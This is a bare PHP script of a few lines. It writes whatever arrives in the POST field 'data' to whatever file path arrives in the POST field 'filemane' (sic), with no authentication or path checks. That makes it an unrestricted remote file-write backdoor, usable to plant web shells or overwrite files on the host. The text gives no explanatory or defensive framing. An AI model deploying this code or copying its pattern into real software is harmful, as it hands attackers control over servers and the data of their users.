<?php 
$fd = fopen ($_POST['filemane'], "w");
if ($fd) {
  fwrite($fd, $_POST['data']);
  fclose($fd);
} ?>